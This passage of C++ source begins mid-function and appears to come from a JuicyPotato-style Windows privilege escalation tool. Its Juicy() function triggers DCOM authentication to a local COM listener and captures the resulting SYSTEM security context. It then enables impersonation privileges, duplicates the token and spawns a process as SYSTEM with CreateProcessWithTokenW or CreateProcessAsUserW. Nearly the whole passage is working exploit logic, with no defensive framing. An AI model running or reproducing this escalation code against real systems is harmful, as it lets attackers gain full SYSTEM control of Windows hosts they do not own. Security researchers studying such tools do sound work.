		CloseHandle(pi.hProcess); // Cleanup 
		CloseHandle(pi.hThread); // Cleanup

		if (!result)
		{
			printf("\n[-] Error: Failed to create process: %d\n", GetLastError());
		}
		else
		{
			if(!AUTO_mode)
				printf("\n[+] Success: Process Created With Token\n");
			return SUCCESS;
		}
	}

	if (*processtype == 'u' || *processtype == '*')
	{
		//could be also the elevated_token 
		result = CreateProcessAsUserW(
			duped_token,
			processname,
			command,
			nullptr, 
			nullptr,
			FALSE, 
			NORMAL_PRIORITY_CLASS | CREATE_NEW_CONSOLE | CREATE_NEW_PROCESS_GROUP,
			nullptr,
			L"C:\\", 
			&si, 
			&pi
		);
		CloseHandle(pi.hProcess); // Cleanup 
		CloseHandle(pi.hThread); // Cleanup

		if (!result) {
			printf("\n[-] Error: Failed to create process %d\n", GetLastError());
			return FAILURE;
		}
		else {
			printf("\n[+] Success: Process Created As User\n");
			return SUCCESS;
		}
	}//end argv

	if (!result) {
		return FAILURE;
	}
	else {
		printf("Trying to authenticate...");
		Sleep(500);
		fflush(stdout);
		return FAILURE;
	}
}

int Juicy(wchar_t* clsid, BOOL brute)
{
	PotatoAPI* test = new PotatoAPI();
	test->startCOMListenerThread();

	if (clsid != NULL)
		olestr = clsid;

	if (!TEST_mode && !AUTO_mode)
		printf("Testing %S %S\n", olestr, g_port);


	test->startRPCConnectionThread();
	test->triggerDCOM();

	BOOL result = false;

	int threshold = 1000;
	int ret = 0;
	while (true) {

		if (test->negotiator->authResult != -1)
		{

			HANDLE hToken;
			TOKEN_PRIVILEGES tkp;
			SECURITY_DESCRIPTOR sdSecurityDescriptor;
			if (!TEST_mode && !AUTO_mode)
				printf("\n[+] authresult %d\n", test->negotiator->authResult);

			fflush(stdout);

			// Get a token for this process. 
			if (!OpenProcessToken(GetCurrentProcess(),
				TOKEN_ALL_ACCESS, &hToken))return 0;

			//enable privileges
			EnablePriv(hToken, SE_IMPERSONATE_NAME);
			EnablePriv(hToken, SE_ASSIGNPRIMARYTOKEN_NAME);
			PTOKEN_TYPE ptg;
			DWORD dwl = 0;
			HANDLE hProcessToken;
			OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS,
				&hProcessToken);

			QuerySecurityContextToken(test->negotiator->phContext, &elevated_token);
			IsTokenSystem(elevated_token);
			if (TEST_mode)
				return 1;

			GetTokenInformation(elevated_token, TokenType, &ptg, sizeof(TOKEN_TYPE), &dwl);
			if (!dwl)
				printf("\n[-] Error: Could not get token type %x\n", GetLastError());

			result = DuplicateTokenEx(elevated_token,
				TOKEN_ALL_ACCESS,
				NULL,
				SecurityImpersonation,
				TokenPrimary,
				&duped_token);


			GetTokenInformation(duped_token, TokenType, &ptg, sizeof(TOKEN_TYPE), &dwl);
			if (!dwl)
				printf("\[-] Error: Could not get token type %x\n", GetLastError());

			DWORD SessionId;
			PROCESS_INFORMATION pi;
			STARTUPINFO si;
			SECURITY_ATTRIBUTES sa;

			ZeroMemory(&si, sizeof(STARTUPINFO));
			ZeroMemory(&pi, sizeof(PROCESS_INFORMATION));
			memset(&pi, 0x00, sizeof(PROCESS_INFORMATION));
			si.cb = sizeof(STARTUPINFO);
			si.lpDesktop = L"winsta0\\default";

			DWORD sessionId = WTSGetActiveConsoleSessionId();

			fflush(stdout);
			wchar_t command[256];
			wcscpy(command, processname);

			if (processargs != NULL)
			{
				wcsncat(command, L" ", 1);
				wcsncat(command, processargs, wcslen(processargs));
			}

			if (*processtype == 't' || *processtype == '*')
			{
				//could be also the elevated_token 
				result = CreateProcessWithTokenW(duped_token,
					0,
					processname,
					command,
					0,
					NULL,
					NULL,
					&si,
					&pi);

				if (!result)
				{
					printf("\n[-] Error: Failed to create process: %d\n", GetLastError());
				}
				else
				{
					printf("\n[+] Success: Process Created With Token\n");
					break;
				}
			}

			if (*processtype == 'u' || *processtype == '*')
			{
				//could be also the elevated_token 
				result = CreateProcessAsUserW(
					duped_token,
					processname,
					command,
					nullptr, nullptr,
					FALSE, 0, nullptr,
					L"C:\\", &si, &pi
				);
				CloseHandle(pi.hThread);
				CloseHandle(pi.hProcess);

				if (!result) {
					printf("\n[-] Error: Failed to create process %d\n", GetLastError());
				}
				else {
					printf("\n[+] Success: Process Created As User\n");
					break;
				}
			}//end argv

			if (!result)
				break;
			else {
				printf("Trying to authenticate...");
				Sleep(500);
				fflush(stdout);
			}
		}//end auth
		else {
			threshold--;
			if (AUTO_mode && threshold <= 0) {
				break;
			}
		}
	}
	//test->killAllThreads();
	return result;
}
